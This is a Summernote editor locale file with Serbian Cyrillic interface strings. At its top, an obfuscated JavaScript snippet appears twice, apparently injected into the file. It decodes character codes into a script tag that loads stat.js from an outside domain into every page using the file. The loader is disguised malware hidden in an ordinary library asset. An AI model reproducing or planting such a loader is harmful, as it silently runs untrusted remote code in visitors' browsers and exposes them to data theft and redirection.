Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'sr-RS': {
      font: {
        bold: 'Подебљано',
        italic: 'Курзив',
        underline: 'Подвучено',
        clear: 'Уклони стилове фонта',
        height: 'Висина линије',
        strikethrough: 'Прецртано',
        size: 'Величина фонта'
      },
      image: {
        image: 'Слика',
        insert: 'Уметни слику',
        resizeFull: 'Пуна величина',
        resizeHalf: 'Умањи на 50%',
        resizeQuarter: 'Умањи на 25%',
        floatLeft: 'Уз леву ивицу',
        floatRight: 'Уз десну ивицу',
        floatNone: 'Без равнања',
        dragImageHere: 'Превуци слику овде',
        selectFromFiles: 'Изабери из датотеке',
        url: 'Адреса слике',
        remove: 'Уклони слику'
      },
      link: {
        link: 'Веза',
        insert: 'Уметни везу',
        unlink: 'Уклони везу',
        edit: 'Уреди',
        textToDisplay: 'Текст за приказ',
        url: 'Интернет адреса',
        openInNewWindow: 'Отвори у новом прозору'
      },
      table: {
        table: 'Табела'
      },
      hr: {
        insert: 'Уметни хоризонталну линију'
      },
      style: {
        style: 'Стил',
        normal: 'Нормални',
        blockquote: 'Цитат',
        pre: 'Код',
        h1: 'Заглавље 1',
        h2: 'Заглавље 2',
        h3: 'Заглавље 3',
        h4: 'Заглавље 4',
        h5: 'Заглавље 5',
        h6: 'Заглавље 6'
      },
      lists: {
        unordered: 'Обична листа',
        ordered: 'Нумерисана листа'
      },
      options: {
        help: 'Помоћ',
        fullscreen: 'Преко целог екрана',
        codeview: 'Изворни код'
      },
      paragraph: {
        paragraph: 'Параграф',
        outdent: 'Смањи увлачење',
        indent: 'Повечај увлачење',
        left: 'Поравнај у лево',
        center: 'Центрирано',
        right: 'Поравнај у десно',
        justify: 'Поравнај обострано'
      },
      color: {
        recent: 'Последња боја',
        more: 'Више боја',
        background: 'Боја позадине',
        foreground: 'Боја текста',
        transparent: 'Провидна',
        setTransparent: 'Провидна',
        reset: 'Опозив',
        resetToDefault: 'Подразумевана'
      },
      shortcut: {
        shortcuts: 'Пречице са тастатуре',
        close: 'Затвори',
        textFormatting: 'Форматирање текста',
        action: 'Акција',
        paragraphFormatting: 'Форматирање параграфа',
        documentStyle: 'Стил документа',
        extraKeys: 'Додатне комбинације'
      },
      history: {
        undo: 'Поништи',
        redo: 'Понови'
      }
    }
  });
})(jQuery);
